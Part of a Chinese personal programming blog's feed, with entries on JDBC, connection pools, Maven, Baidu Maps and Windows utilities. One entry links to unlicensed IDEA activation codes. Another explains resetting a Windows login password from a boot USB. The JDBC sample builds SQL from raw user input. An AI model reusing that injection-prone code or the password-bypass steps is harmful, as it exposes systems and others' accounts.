        <content type="html"><![CDATA[<h3 id="迷茫"><a href="#迷茫" class="headerlink" title="迷茫"></a>迷茫</h3><p>我已经深刻体会到了，毕业将面临找工作的压力，别问我为啥能感受到，因为我跟别人不一样，其实有这种感觉也是来源于网上各种舆论，学长找不到工作，他说学校不会安排，这个行业凭本事吃饭，他讲学历是一方面，能力也是一方面，学历会让你失去机会，而能力会让你失去饭碗。再过一段时间找不到工作，他就回家种棉花了。我鼓舞了他一番后陷入了深思。我其实很容易接纳别人的观点，无论对方调侃，反驳，称赞，我都会去考虑一下他所站立场的想法，然后引以为戒，总结经验，准备下一步该怎么做。<br>这段时间，无论是学习上，还是思想上我都进入了白热化，但这种白热化，很快了带来了瓶颈问题，在web框架技术的学习极为困难，也有可能是知识比较新，网上学习资源很稀少，凌乱。我自己胡乱摸索着，也不知道什么时候能到头。另一方面，在英语上，英语的学习十分吃力，我不仅想起了谁说的那句话，英语从小学开始学了那么多年都没有学会，你觉得再给你几年你就能会了？我在思想上可能又在做一件没有结果的事，有些人讲，结果不重要，重要的是过程，其实这可能是鼓励失败者的一种方式吧。<br>没有结果的事，谁又愿意去做呢，哎！总之就很迷茫，反正不给自己留遗憾就好了！</p><h3 id="觉悟"><a href="#觉悟" class="headerlink" title="觉悟"></a>觉悟</h3><p>我最大的改变可能就是，我会时常反省一下自己，发现不足然后去改正，自制力从上了大学也有一定的提升，同时我越来越觉得自己垃圾。<br>在学习编程上，我也发现了一个学习的致命问题，就是眼睛和大脑都会欺骗自己，但是唯有自己的手不会<br>举个例子：<br>眼睛：好像挺简单<br>大脑：我会了<br>手：老子都写不出来，你们会个屁。<br>于是我把学会的标准重新定义了。<br>人生其实就是一场时间游戏，你刷的经验越多，等级越高，把时间用来提升自己就对了，但是很多人在能觉悟的时候，都已经过了奋斗的年龄。<br>我现在努力变优秀，因为我发现，我也有很多喜欢的东西，也有想守护的人。如果我不努力，我将会失去它们~~~</p>]]></content>
      
      
      <categories>
          
          <category> Draiy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各种JAR包</title>
      <link href="/2019/11/15/framework/mysqljar/"/>
      <url>/2019/11/15/framework/mysqljar/</url>
      
        <content type="html"><![CDATA[<h3 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h3><p><a href="http://central.maven.org/maven2/mysql/mysql-connector-java/" target="_blank" rel="noopener">各版本MySQL驱动</a><br><a href="https://blog.csdn.net/pro_fan/article/details/91409516" target="_blank" rel="noopener">常用jar包下载</a><br><a href="https://www.kumapai.com/open" target="_blank" rel="noopener">jar包下载网址</a><br><a href="https://mvnrepository.com" target="_blank" rel="noopener">国内Maven镜像地址</a></p>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 驱动 </tag>
            
            <tag> JAR包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百度地图API</title>
      <link href="/2019/11/12/framework/baidumap/"/>
      <url>/2019/11/12/framework/baidumap/</url>
      
        <content type="html"><![CDATA[<h3 id="地图API"><a href="#地图API" class="headerlink" title="地图API"></a>地图API</h3><p>其实没必要解释太多了，就是地图，只不过是静态那种，因为没有GPS的支持，所以你懂的，为啥用百度，因为它文档的字我能看懂，那为啥不用谷歌，那肯定是因为谷歌上面都是英文，我看不懂而且注册个啥还要外网贼卡！</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>我还是喜欢用简短的话来表达，使用百度地图API，需要有百度账号，然后进到这个<a href="http://lbsyun.baidu.com/" target="_blank" rel="noopener">百度地图</a>官网，登录上去。<br><img src="http://img.ahdy.top/2019-11-12_213627.png" alt><br>这我只用到了Javascript API，因为别的我也不会…<br>然后你看API，它应该会让你去认证一下子，认证好了就就到控制台创建一个应用。<br><img src="http://img.ahdy.top/2019-11-12_213918.png" alt><br>在白名单里，打个*号就行。<br><img src="http://img.ahdy.top/2019-11-12_214732.png" alt><br>创建好了之后可以参考。<br><a href="http://lbsyun.baidu.com/jsdemo.htm#i8_2" target="_blank" rel="noopener">开放平台</a></p><h4 id="这里生成的API-KEY需要添加到你的DEMO当中，I-believe-you-make-sense。"><a href="#这里生成的API-KEY需要添加到你的DEMO当中，I-believe-you-make-sense。" class="headerlink" title="这里生成的API KEY需要添加到你的DEMO当中，I believe you make sense。"></a>这里生成的API KEY需要添加到你的DEMO当中，I believe you make sense。</h4><h3 id="成品"><a href="#成品" class="headerlink" title="成品"></a>成品</h3><h4 id="指定地点显示"><a href="#指定地点显示" class="headerlink" title="指定地点显示"></a>指定地点显示</h4><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;meta name=&quot;viewport&quot; content=&quot;initial-scale=1.0, user-scalable=no&quot; /&gt;&lt;style type=&quot;text/css&quot;&gt;body, html,#allmap {width: 100%;height: 100%;overflow: hidden;margin:0;font-family:&quot;微软雅黑&quot;;}&lt;/style&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;//api.map.baidu.com/api?v=2.0&amp;ak=VdlHAppjcIXtyeSX75HqYSphoGuoGjcY&quot;&gt;&lt;/script&gt;&lt;title&gt;地图展示&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;allmap&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;script type=&quot;text/javascript&quot;&gt;// 百度地图API功能var map = new BMap.Map(&quot;allmap&quot;);    // 创建Map实例map.centerAndZoom(new BMap.Point(117.35, 32.95), 11);  // 初始化地图,设置中心点坐标和地图级别//添加地图类型控件map.addControl(new BMap.MapTypeControl({    mapTypes:[        BMAP_NORMAL_MAP,        BMAP_HYBRID_MAP    ]}));      map.setCurrentCity(&quot;蚌埠&quot;);          // 设置地图显示的城市 此项是必须设置的map.enableScrollWheelZoom(true);     //开启鼠标滚轮缩放</code></pre><h4 id="IP定位显示"><a href="#IP定位显示" class="headerlink" title="IP定位显示"></a>IP定位显示</h4><pre><code>这里我加了一个搜索可以根据自己需求&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;meta name=&quot;viewport&quot; content=&quot;initial-scale=1.0, user-scalable=no&quot; /&gt;&lt;style type=&quot;text/css&quot;&gt;body, html{width: 100%;height: 100%;margin:0;font-family:&quot;微软雅黑&quot;;}#allmap {height: 500px;width:100%;overflow: hidden;}#result {width:100%;font-size:12px;}dl,dt,dd,ul,li{    margin:0;    padding:0;    list-style:none;}dt{    font-size:14px;    font-family:&quot;微软雅黑&quot;;    font-weight:bold;    border-bottom:1px dotted #000;    padding:5px 0 5px 5px;    margin:5px 0;}dd{    padding:5px 0 0 5px;}li{    line-height:28px;}&lt;/style&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://api.map.baidu.com/api?v=2.0&amp;ak=VdlHAppjcIXtyeSX75HqYSphoGuoGjcY&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://api.map.baidu.com/library/SearchInfoWindow/1.5/src/SearchInfoWindow_min.js&quot;&gt;&lt;/script&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;http://api.map.baidu.com/library/SearchInfoWindow/1.5/src/SearchInfoWindow_min.css&quot; /&gt;&lt;title&gt;带检索功能的信息窗口&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;allmap&quot;&gt;    &lt;/div&gt;&lt;div id=&quot;result&quot;&gt;    &lt;input type=&quot;button&quot; value=&quot;默认样式&quot; onclick=&quot;openInfoWindow2()&quot;/&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;// 百度地图API功能var map = new BMap.Map(&quot;allmap&quot;);var point = new BMap.Point(116.331398,39.897445);map.centerAndZoom(point,12);function myFun(result){    var cityName = result.name;    map.setCenter(cityName);    alert(&quot;当前定位城市:&quot;+cityName);}var myCity = new BMap.LocalCity();myCity.get(myFun);&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;// 百度地图API功能var map = new BMap.Map(&#39;allmap&#39;);var poi = new BMap.Point(116.307852,40.057031);map.centerAndZoom(poi, 16);map.enableScrollWheelZoom();var content = &#39;&lt;div style=&quot;margin:0;line-height:20px;padding:2px;&quot;&gt;&#39; +                &#39;&lt;img src=&quot;../img/baidu.jpg&quot; alt=&quot;&quot; style=&quot;float:right;zoom:1;overflow:hidden;width:100px;height:100px;margin-left:3px;&quot;/&gt;&#39; +                &#39;地址：北京市海淀区上地十街10号&lt;br/&gt;电话：(010)59928888&lt;br/&gt;简介：百度大厦位于北京市海淀区西二旗地铁站附近，为百度公司综合研发及办公总部。&#39; +              &#39;&lt;/div&gt;&#39;;//创建检索信息窗口对象var searchInfoWindow = null;searchInfoWindow = new BMapLib.SearchInfoWindow(map, content, {        title  : &quot;百度大厦&quot;,      //标题        width  : 290,             //宽度        height : 150,              //高度        panel  : &quot;panel&quot;,         //检索结果面板        enableAutoPan : true,     //自动平移        searchTypes   :[            BMAPLIB_TAB_SEARCH,   //周边检索            BMAPLIB_TAB_TO_HERE,  //到这里去            BMAPLIB_TAB_FROM_HERE //从这里出发        ]    });var marker = new BMap.Marker(poi); //创建marker对象marker.enableDragging(); //marker可拖拽marker.addEventListener(&quot;click&quot;, function(e){    searchInfoWindow.open(marker);})map.addOverlay(marker); //在地图中添加marker//样式1var searchInfoWindow2 = new BMapLib.SearchInfoWindow(map, &quot;信息检索&quot;, {    title: &quot;搜索框&quot;, //标题    panel : &quot;panel&quot;, //检索结果面板    enableAutoPan : true, //自动平移    searchTypes :[        BMAPLIB_TAB_SEARCH   //周边检索    ]});function openInfoWindow2() {    searchInfoWindow2.open(new BMap.Point(117.35707987,32.92949891));}&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h3><p><img src="http://img.ahdy.top/2019-11-12_215537.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 地图 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> API </tag>
            
            <tag> 地图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis集成</title>
      <link href="/2019/11/08/framework/mybatis-druid/"/>
      <url>/2019/11/08/framework/mybatis-druid/</url>
      
        <content type="html"><![CDATA[<h3 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h3><p>死亡三问解答<br>什么是Mybatis？我也不清楚，只知道它是SSM框架整合当中的其中一个，它就是M，它有什么用？具体的我也不知道，它的作用是让你对增删改查更懵逼。为啥要用它，这个解释不了，就像有些东西早已注定了的。</p><h3 id="Durid"><a href="#Durid" class="headerlink" title="Durid"></a>Durid</h3><p>这个是阿里的数据库连接池，支付宝淘宝专用的，阿里还是非常无私的把它开源了出来，它的功能性堪称连接池之最。如果觉得我说得不够详细可以参考以下文档。<br><a href="https://www.jianshu.com/p/01a96c31ca59" target="_blank" rel="noopener">参考文档</a><br>它的用法跟其他连接池大同小异，一般的，连接池都会有它专属的对象，去new一些配置。</p><h3 id="项目源码"><a href="#项目源码" class="headerlink" title="项目源码"></a>项目源码</h3><p>该项目是使用Durid进行的SQL查询，能起到模仿学习的作用。</p><p><a href="https://pan.baidu.com/s/1Q2Sc9Gkl7nFB827kglvDPQ" target="_blank" rel="noopener">项目下载</a></p><h3 id="Mybatis集成Durid项目源码"><a href="#Mybatis集成Durid项目源码" class="headerlink" title="Mybatis集成Durid项目源码"></a>Mybatis集成Durid项目源码</h3><p>这个还没弄好，过两天发上来吧！</p><h3 id="集成图文教程"><a href="#集成图文教程" class="headerlink" title="集成图文教程"></a>集成图文教程</h3>]]></content>
      
      
      <categories>
          
          <category> Mybatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mybatis </tag>
            
            <tag> Durid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA激活码</title>
      <link href="/2019/11/06/framework/ideacoad/"/>
      <url>/2019/11/06/framework/ideacoad/</url>
      
        <content type="html"><![CDATA[<h3 id="激活码地址一"><a href="#激活码地址一" class="headerlink" title="激活码地址一"></a>激活码地址一</h3><p><a href="http://idea.medeming.com/code/" target="_blank" rel="noopener">激活码地址</a><br>据说这个激活码能激活这家公司所有的软件<br>如果上述地址不行的话试试下面的，这个博主应该会更新！<br><a href="https://www.41sh.cn/?id=101" target="_blank" rel="noopener">博客地址</a></p><h3 id="激活码地址二"><a href="#激活码地址二" class="headerlink" title="激活码地址二"></a>激活码地址二</h3><p><a href="https://shitac.tech/thief" target="_blank" rel="noopener">激活码地址</a></p><h3 id="激活码地址三"><a href="#激活码地址三" class="headerlink" title="激活码地址三"></a>激活码地址三</h3><p><a href="http://lookdiv.com/" target="_blank" rel="noopener">激活码地址</a></p><pre><code>钥匙:lookdiv.com</code></pre><h3 id="激活码地址四"><a href="#激活码地址四" class="headerlink" title="激活码地址四"></a>激活码地址四</h3><p><a href="https://github.com/Alkian/jihuo" target="_blank" rel="noopener">GitHub地址</a></p>]]></content>
      
      
      <categories>
          
          <category> IDEA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
            <tag> 激活码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C3p0数据库连接池</title>
      <link href="/2019/11/05/framework/c3p0/"/>
      <url>/2019/11/05/framework/c3p0/</url>
      
        <content type="html"><![CDATA[<h3 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h3><p>如果与数据库进行交互，必须导入相应的数据库驱动，以为maven为例子，需要在pom.xml当中引入相关jar包的下载地址<br>   <img src="http://img.ahdy.top/2019-11-05_233632.png" alt></p><h3 id="jbdc相关配置"><a href="#jbdc相关配置" class="headerlink" title="jbdc相关配置"></a>jbdc相关配置</h3><p>jar包引入相关MySQL，最好用5.1版本以上的。  </p><pre><code>import java.io.InputStream;import java.sql.*;import java.util.Properties;import java.util.Scanner;public class test {static PreparedStatement pstmt=null;static Connection dbConn =null;static ResultSet rs=null;static InputStream fis=null;static Properties pp=null;static String driver=&quot;&quot;;static String url=&quot;&quot;;static String username=&quot;&quot;;static String password=&quot;&quot;;public static void testConnect(String sql) throws Exception{    // 注册MySQL驱动 (可以省略这一步)    Class.forName(&quot;com.mysql.jdbc.Driver&quot;);    // 连接MySQL服务器    String username= &quot;root&quot;;    String password = &quot;&quot;;    String connectionUrl = &quot;jdbc:mysql://127.0.0.1:3306/java?useUnicode=true&amp;characterEncoding=UTF-8&quot;;    Connection conn = DriverManager.getConnection(connectionUrl, username, password);    System.out.println(&quot;连接成功!&quot;);    Statement statement =conn.createStatement();    rs=statement.executeQuery(sql);    while (rs.next())    {        String name=rs.getString(&quot;name&quot;);        String wpassword =rs.getString(&quot;password&quot;);        System.out.println(name+&quot;\t&quot;+wpassword);        //由这啥接口带回来的一个对象，对象内包含对数据库的查询数据    }    conn.close();}public void  findbyid(){}public static void main(String[] args) throws Exception {    Scanner src =new Scanner(System.in);    System.out.println(&quot;尊敬的超级管理员,欢迎您\n请输入id进行查询&quot;);    int id =src.nextInt();    String sql=&quot;select * from user where id=&quot;+id;    System.out.println(sql);    try {        testConnect(sql);    } finally {        System.out.println(&quot;关闭连接!&quot;);    }}}</code></pre><h4 id="长连接，与短连接"><a href="#长连接，与短连接" class="headerlink" title="长连接，与短连接"></a>长连接，与短连接</h4><p>短连接是指，使用完一次SQL语句后就关闭对数据库的连接，该方法操作简单，缺点效率不够高<br>长连接顾名思义与短连接相反，它是指在连接成功时候，使用多条SQL语句，难点就在于什么时候断开连接，开发维护有一定难度。</p><h4 id="普通查询和预处理查询"><a href="#普通查询和预处理查询" class="headerlink" title="普通查询和预处理查询"></a>普通查询和预处理查询</h4><p>这两个查询完全取决于两个不同的接口<br>1.Statement//普通查询<br>2.preparedstatement//预处理查询<br>使用第二种查询是目前主流，它具有一定防御SQL注入的功能。</p><h3 id="C3p0连接池的使用"><a href="#C3p0连接池的使用" class="headerlink" title="C3p0连接池的使用"></a>C3p0连接池的使用</h3><p>该项目源码未使用maven，如果你使用了maven，可以百度找到相关jar包的仓库地址引入pom.xml配置文件当中。与其效果一样。<br>1.使用连接池必须添加相关的jar包，这种包可以称它为第三方框架<br><a href="https://share.weiyun.com/5KTiFSF" target="_blank" rel="noopener">jar包下载</a><br>2.添加c3p0的配置文件，该文件名必须以c3p0-config.xml命名<br><a href="https://share.weiyun.com/5WheqVp" target="_blank" rel="noopener">配置文件下载</a><br>该文件建议放在src目录下<br>3.项目源码<br><a href="https://pan.baidu.com/s/1ucYrlp6wB8UDBWOBwKGfFQ" target="_blank" rel="noopener">下载</a><br><img src="http://img.ahdy.top/2019-11-05_231600.png" alt><br>这里简单配置好了一个，数据库自己建吧！记得修改xml里数据库的相关参数。如果导入项目报红，或者出现红叉一般是jre/jdk不兼容导致的，删除项目当中的jdk，添加你电脑本地的jar。<br>4.为什么使用连接池？<br>因为连接池能优化连接次数，减少资源消耗，大大提高访问数据库的时间效率，目前druid被称为功能性最强的连接池，它是阿里，支付宝专用连接池，提供了服务监控，线程，防注入等功能。学到后面连接池会搭配一些优秀框架来集成使用，这就是大佬口中常说的框架整合。</p>]]></content>
      
      
      <categories>
          
          <category> C3p0 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 连接池 </tag>
            
            <tag> C3p0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA创建Maven项目</title>
      <link href="/2019/10/23/framework/maven/"/>
      <url>/2019/10/23/framework/maven/</url>
      
        <content type="html"><![CDATA[<h3 id="Maven简述"><a href="#Maven简述" class="headerlink" title="Maven简述"></a>Maven简述</h3><p>Maven项目对象模型(POM)，可以通过一小段描述信息来管理项目的构建，报告和文档的项目管理工具软件。<br>Maven 除了以程序构建能力为特色之外，还提供高级项目管理工具。由于 Maven 的缺省构建规则有较高的可重用性，所以常常用两三行 Maven 构建脚本就可以构建简单的项目。由于 Maven 的面向项目的方法，许多 Apache Jakarta 项目发文时使用 Maven，而且公司项目采用 Maven 的比例在持续增长。<br>Maven这个单词来自于意第绪语（犹太语），意为知识的积累，最初在Jakata Turbine项目中用来简化构建过程。当时有一些项目（有各自Ant build文件），仅有细微的差别，而JAR文件都由CVS来维护。于是希望有一种标准化的方式构建项目，一个清晰的方式定义项目的组成，一个容易的方式发布项目的信息，以及一种简单的方式在多个项目中共享JARs。<br>至于具体有什么用，还需要以后，嗯，工作了之后才能继续深入吧，记得当时，老师简单的解释了它通过中央仓库便捷导入jar包的功能，不过那是基于eclipse上的，这篇文章将记录IDEA的Maven集成过程。</p><h3 id="Maven下载"><a href="#Maven下载" class="headerlink" title="Maven下载"></a>Maven下载</h3><p>已经很久没有这样写文档了，不知道是怎么了，这段时间很浮躁，内心焦虑不安。<br><a href="http://maven.apache.org/" target="_blank" rel="noopener">maven官网</a><br>进入之后，找到downlog，下载界面<br><img src="http://img.ahdy.top/2019-10-23_144207.png" alt="maven官网"><br>看到这些，是不是感觉英文很重要了呢？据说高级程序员都会根据官方最新发布的文档自主学习!<br>maven就选binary.zip包下载。<br>完成后解压缩.</p><h3 id="本地仓库的创建"><a href="#本地仓库的创建" class="headerlink" title="本地仓库的创建"></a>本地仓库的创建</h3><p>大概就是会在你指定的一个文件夹内下载jar包。<br>Maven 的本地仓库，在安装 Maven 后并不会创建，它是在第一次执行 maven 命令的时候才被创建。</p><p>运行 Maven 的时候，Maven 所需要的任何构件都是直接从本地仓库获取的。如果本地仓库没有，它会首先尝试从远程仓库下载构件至本地仓库，然后再使用本地仓库的构件。</p><p>默认情况下，不管Linux还是 Windows，每个用户在自己的用户目录下都有一个路径名为 .m2/respository/ 的仓库目录。</p><p>Maven 本地仓库默认被创建在 %USER_HOME% 目录下。要修改默认位置，在 %M2_HOME%\conf 目录中的 Maven 的 settings.xml 文件中定义另一个路径。<br>1.创建一个新文件夹<br><img src="http://img.ahdy.top/2019-10-23_145333.png" alt><br>2.打开该路径下setting.xml配置文件<br><img src="http://img.ahdy.top/2019-10-23_145404.png" alt><br>3.找到并修改该标签，将标签内参数改为你设置的仓库地址<br><img src="http://img.ahdy.top/2019-10-23_145744.png" alt="保存退出"></p><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><p>我开始没想到，这么小个包，也要环境变量，于是又踩了很多坑<br><a href="https://www.runoob.com/maven/maven-setup.html" target="_blank" rel="noopener">菜鸟教程</a><br>直接去菜鸟吧！一定要在系统环境变量里配置，不然，我也不确定有什么未知的事情发生。<br>配置好之后 输入 mvn -v<br>检测一下是否成功！一般会出现阿帕奇maven的版本号。</p><h3 id="下载jar包"><a href="#下载jar包" class="headerlink" title="下载jar包"></a>下载jar包</h3><p>mvn help:system<br>命令打在cmd下<br><img src="http://img.ahdy.top/2019-10-23_155652.png" alt><br>时间怪长的<br><img src="http://img.ahdy.top/2019-10-23_160713.png" alt><br>这就装好了</p><h3 id="集成maven"><a href="#集成maven" class="headerlink" title="集成maven"></a>集成maven</h3><p><img src="http://img.ahdy.top/2019-10-23_161200.png" alt><br>我相信你是会用idea的。<br><img src="http://img.ahdy.top/2019-10-23_161539.png" alt><br>不会英语其实没事，你只要看到这个quickxxx的，肯定意思就是快速创建啥玩意的，然后后面会让起个什么名，类似版本号项目名，随便搞点进去就可以。<br><img src="http://img.ahdy.top/2019-10-23_163017.png" alt><br>配置你电脑上maven的设置和仓库</p><p><img src="http://img.ahdy.top/2019-10-23_161850.png" alt="等一会就好"><br>项目完成<br><img src="http://img.ahdy.top/2019-10-23_164719.png" alt></p><h3 id="中央仓库"><a href="#中央仓库" class="headerlink" title="中央仓库"></a>中央仓库</h3><p>Maven 中央仓库是由 Maven 社区提供的仓库，其中包含了大量常用的库。</p><p>中央仓库包含了绝大多数流行的开源Java构件，以及源码、作者信息、SCM、信息、许可证信息等。一般来说，简单的Java项目依赖的构件都可以在这里下载到。</p><p>中央仓库的关键概念：</p><p>这个仓库由 Maven 社区管理。<br>不需要配置。<br>需要通过网络才能访问。<br>要浏览中央仓库的内容，maven 社区提供了一个 URL：<a href="http://search.maven.org/#browse。使用这个仓库，开发人员可以搜索所有可以获取的代码库。" target="_blank" rel="noopener">http://search.maven.org/#browse。使用这个仓库，开发人员可以搜索所有可以获取的代码库。</a></p><h3 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h3><p>如果 Maven 在中央仓库中也找不到依赖的文件，它会停止构建过程并输出错误信息到控制台。为避免这种情况，Maven 提供了远程仓库的概念，它是开发人员自己定制仓库，包含了所需要的代码库或者其他工程中用到的 jar 文件。</p><p>举例说明，使用下面的 pom.xml，Maven 将从远程仓库中下载该 pom.xml 中声明的所依赖的（在中央仓库中获取不到的）文件。<br>这个一般用不到，了解一下。</p><h3 id="其他库"><a href="#其他库" class="headerlink" title="其他库"></a>其他库</h3><p>这些库都是国外的，缺点显而易见，就是慢，访问不动。当然中国也有相应的库，比如阿里的。</p>]]></content>
      
      
      <categories>
          
          <category> Maven </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
            <tag> Maven </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSP</title>
      <link href="/2019/10/22/framework/jspuplogin/"/>
      <url>/2019/10/22/framework/jspuplogin/</url>
      
        <content type="html"><![CDATA[<h3 id="Servlet特性"><a href="#Servlet特性" class="headerlink" title="Servlet特性"></a>Servlet特性</h3><p>在Servlet3.0之后，更新了文件上传相关的API。<br>不用导入jar包就能实现文件上传功能。</p><h3 id="架构与原理"><a href="#架构与原理" class="headerlink" title="架构与原理"></a>架构与原理</h3><p>文件上传，自然少不了，前后端的结合，前端需要提供给用户选择上传文件，后者数据传输到servlet，Servlet主要利用到了两个流传输API<br><a href="https://www.jianshu.com/p/e5bc7ea5f948" target="_blank" rel="noopener">API地址</a></p><h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h3><p><a href="[](https://www.jianshu.com/p/e5bc7ea5f948">百度网盘</a>)<br><a href="https://bbs.csdn.net/topics/390772658" target="_blank" rel="noopener">地址空指针异常问题</a><br>简单封装实现了文件的上传下载功能。</p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>没有UI界面，原生态的，仅仅实现了功能，bug未知。</p>]]></content>
      
      
      <categories>
          
          <category> fileLogin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> servlet </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统维护工具</title>
      <link href="/2019/10/19/framework/protectwin/"/>
      <url>/2019/10/19/framework/protectwin/</url>
      
        <content type="html"><![CDATA[<h3 id="软媒魔方"><a href="#软媒魔方" class="headerlink" title="软媒魔方"></a>软媒魔方</h3><p><a href="https://mofang.ruanmei.com/" target="_blank" rel="noopener">官方网站</a><br>这些工具主要是针对维护系统的，虽然在16年就停止了更新，但其实用性与影响意义深远！  </p><p>这篇文档算是划水吧，我发现我现在也变得油条了，写文档很少打字，以前，写一篇文档准备很久的时间!</p><h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h3><p>下载绿色完整版，为什么下这个版本因为它免安装，在众多.exe文件的底部，有一个读我.exe文件。这个文件很好了解释了每个.exe程序的功能！<br><img src="http://img.ahdy.top/2019-10-19_150045.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>破解电脑开机密码</title>
      <link href="/2019/10/19/framework/winpassword/"/>
      <url>/2019/10/19/framework/winpassword/</url>
      
        <content type="html"><![CDATA[<h3 id="故事的起因"><a href="#故事的起因" class="headerlink" title="故事的起因"></a>故事的起因</h3><p>人们常说事务的发展具有两面性，我觉得吧，也差不多，起因是GitHub仓库不行了，又因为安卓给电脑搞个半身不遂，我越想越气急败坏啊（好像用错词了！），反正一心就想重装系统。这不因此也得到了多方面能力的提升。比如装系统，但接下来要说的，建立在装系统的基础之上。</p><h3 id="重装系统"><a href="#重装系统" class="headerlink" title="重装系统"></a>重装系统</h3><p>怎么重装系统的呢！简单归纳一下。<br>1.首先得确定你的电脑是否要重装，什么情况需要重装系统，举个简单的例子，开机黑屏。<br>2.系统界面都进不去，肯定要重装系统了，这时就需要一个U盘，当然这个U盘也不是普普通通的U盘，它是需要经过启动盘工具制作而成后的U盘，这块不懂可以自学一下，很简单。<br>3.开机狂按 什么f6—-f12 del键反正就是进Bios，这个键跟你电脑厂家，主板型号有关系，总之它不是固定的，每个牌子的电脑可能都不太一样。<br>4.进入BIOS之后，你需要找到U盘启动，进行开机。<br>5.之后电脑就会载入U盘里的系统，这种系统通常被用作维护类工具。</p><h3 id="用户密码存储路径"><a href="#用户密码存储路径" class="headerlink" title="用户密码存储路径"></a>用户密码存储路径</h3><p><img src="http://img.ahdy.top/2019-10-19_141320.png" alt><br>用户密码都存储在这个文件内当然你是没有权限打开这个文件夹的</p><h3 id="杏雨梨云工具"><a href="#杏雨梨云工具" class="headerlink" title="杏雨梨云工具"></a>杏雨梨云工具</h3><p><a href="https://www.xyboot.com/" target="_blank" rel="noopener">官方博客</a><br>这个启动盘功能非常多进可以用短小精悍来形容它，其中就包括了修改电脑用户密码的功能。  </p><h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h3><p><img src="http://img.ahdy.top/2019-10-16_221957.png" alt><br>下载好之后，你应该会得到一个压缩包，解压它，首先你需要一个空的U盘，假如这时U盘里有很重要的东西就拉出来保存，然后再格式化U盘，然后运行压缩包内的.exe程序，它会自动读取你的U盘，然后你选择开始制作启动盘即可，U盘格式为NTFS格式，一般默认安装即可，等待启动盘制作成功之后，需要将压缩包内的白文件，移动到启动盘内（U盘内），这时候开机进入Bios就能使用启动盘内的工具来达到修改用户名密码的作用。</p><h3 id="意外"><a href="#意外" class="headerlink" title="意外"></a>意外</h3><p>什么情况下，修改密码会失败？当用户使用的登录方式不是本地登录，例如，使用了微软账户登录，或者对方电脑设置了Bios密码，导致无法进入Bios。</p>]]></content>
      
      
      <categories>
          
          <category> 系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> 解密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>美化系统主题</title>
      <link href="/2019/10/15/framework/system/"/>
      <url>/2019/10/15/framework/system/</url>
      
